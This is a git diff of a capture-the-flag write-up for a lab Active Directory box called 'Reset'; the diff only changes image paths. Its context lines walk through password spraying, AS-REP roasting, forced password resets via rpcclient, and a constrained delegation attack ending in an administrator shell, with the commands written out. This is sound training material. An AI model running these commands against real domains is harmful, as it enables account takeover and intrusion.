@@ -70,11 +70,11 @@ $ smbclient //haystack.thm.corp/data
 Password for [WORKGROUP\kali]:
 ```
 
-![](../assets/img/2026-03-27-Reset/1.png)
+![](/assets/img/2026-03-27-Reset/1.png)
 
 Opening these files discloses the company's default password for new employees, which makes sense as the directory we pulled them from stores the onboarding documents.
 
-![](../assets/img/2026-03-27-Reset/2.png)
+![](/assets/img/2026-03-27-Reset/2.png)
 
 I did find a potential username for _Lily Oneill_ in one of the PDFs, however we already have SMB authentication, so I'll brute force RIDs to get a solid list of account names on the domain.
 
@@ -86,7 +86,7 @@ $ nxc smb haystack.thm.corp -u 'Guest' -p '' --rid-brute 2000 > users.txt
 $ cat users.txt | awk -F'\\' '{print $2}' | awk '{print $1}' > validusers.txt
 ```
 
-![](../assets/img/2026-03-27-Reset/3.png)
+![](/assets/img/2026-03-27-Reset/3.png)
 
 Now that we know the default password and have a list of valid users, I use Netexec to spray the domain for any accounts that are newer or forgot to change the initial password.
 
@@ -94,7 +94,7 @@ Now that we know the default password and have a list of valid users, I use Nete
 $ nxc smb haystack.thm.corp -u validusers.txt -p 'ResetMe123!' --continue-on-success
 ```
 
-![](../assets/img/2026-03-27-Reset/4.png)
+![](/assets/img/2026-03-27-Reset/4.png)
 
 ## AS-REP Roasting
 This only gives us logons for a few accounts that fallback to using Guest authentication, which does not help us. Next, I'll test to see if any of the previously-enumerated accounts are active on the domain using [Kerbrute](https://github.com/ropnop/kerbrute).
@@ -103,7 +103,7 @@ This only gives us logons for a few accounts that fallback to using Guest authen
 $ kerbrute userenum validusers.txt --dc haystack.thm.corp -d thm.corp
 ```
 
-![](../assets/img/2026-03-27-Reset/5.png)
+![](/assets/img/2026-03-27-Reset/5.png)
 
 Those results validate the existence of all the users. Now I'll check to see if any of them have the Kerberos pre-auth attribute disabled, which would let us AS-REP roast their hashes to get credentials.
 
@@ -116,16 +116,16 @@ I use Impacket's [GetNPUsers script](https://github.com/fortra/impacket/blob/mas
 $ impacket-GetNPUsers -dc-ip 10.67.131.191 -usersfile ../reset/validusers.txt -no-pass thm.corp/
 ```
 
-![](../assets/img/2026-03-27-Reset/6.png)
+![](/assets/img/2026-03-27-Reset/6.png)
 
 That returns three `KRB5ASREP` hashes and after sending them over to JohnTheRipper or Hashcat, we recover the plaintext password for the account belonging to `TABATHA_BRITT`.
 
-![](../assets/img/2026-03-27-Reset/7.png)
+![](/assets/img/2026-03-27-Reset/7.png)
 
 ### Initial Foothold
 Authenticating over SMB verifies that we have access to her account as well as the ability to RDP onto the system. 
 
-![](../assets/img/2026-03-27-Reset/8.png)
+![](/assets/img/2026-03-27-Reset/8.png)
 
 I should note that I attempted to Kerberoast other users and got quite a few hashes back, however nothing came of them through hash-cracking. Interestingly enough, when we RDP onto the machine, we are granted some kind of temporary logon and are thrown into the `C:\Users\TEMP` directory.
 
@@ -144,7 +144,7 @@ $ sudo bloodhound
 
 After letting those JSON files ingest for a moment, I start by enumerating any user privileges that we may be able to abuse for accounts we already have access to. I discover a trend of connected users through their outbound object controls which shows a clear path to an account with higher privileges.
 
-![](../assets/img/2026-03-27-Reset/9.png)
+![](/assets/img/2026-03-27-Reset/9.png)
 
 ### Exploit Chain
 As it stands, Tabatha has GenericAll over `SHAWNA_BRAY`, who can forcefully change the password for `CRUZ_HALL`. Finally, they can change the password of `DARLA_WINTERS` who is trusted for Constrained Delegation.
@@ -193,14 +193,14 @@ Password for [THM.CORP\CRUZ_HALL]:
 rpcclient $> setuserinfo2 DARLA_WINTERS 23 Password123!
 ```
 
-![](../assets/img/2026-03-27-Reset/10.png)
+![](/assets/img/2026-03-27-Reset/10.png)
 
 Quickly checking authentication with Netexec shows that this does indeed work, next up is abusing the delegation privileges to gain access to the filesystem. 
 
 ### Constrained Delegation Attack
 Bloodhound's Linux Abuse info tab recommends using Impacket's [getST.py script](https://github.com/fortra/impacket/blob/master/examples/getST.py) in order to carry out this attack, which is exactly what I'll do.
 
-![](../assets/img/2026-03-27-Reset/11.png)
+![](/assets/img/2026-03-27-Reset/11.png)
 
 We already have the account password so there's no need to supply a hash. Make sure to use the `-k` option to specify Kerberos authentication as well as our arbitrary SPN to match the CIFS.
 
@@ -208,7 +208,7 @@ We already have the account password so there's no need to supply a hash. Make s
 $ impacket-getST -spn 'cifs/haystack.thm.corp' -impersonate 'administrator' -k 'thm.corp/DARLA_WINTERS' 
 ```
 
-![](../assets/img/2026-03-27-Reset/12.png)
+![](/assets/img/2026-03-27-Reset/12.png)
 
 After we have that ticket forged, we can export it to the KRB5CCNAME variable and use it along with a tool like [wmiexec](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) to grab a shell on the system with administrative privileges.
 
@@ -217,6 +217,6 @@ $ export KRB5CCNAME=[SAVED_TICKET_NAME]
 $ impacket-wmiexec thm.corp/Administrator@HAYSTACK.THM.CORP -k -no-pass
 ```
 
-![](../assets/img/2026-03-27-Reset/13.png)
+![](/assets/img/2026-03-27-Reset/13.png)
 
 Grabbing both flags inside of the Administrator and Automate account's respective Desktop folders completes this challenge. Overall this box wasn't too difficult since tools like Bloodhound sniff out misconfigurations and privileges to abuse quite easily. I hope this was helpful to anyone following along or stuck and happy hacking!
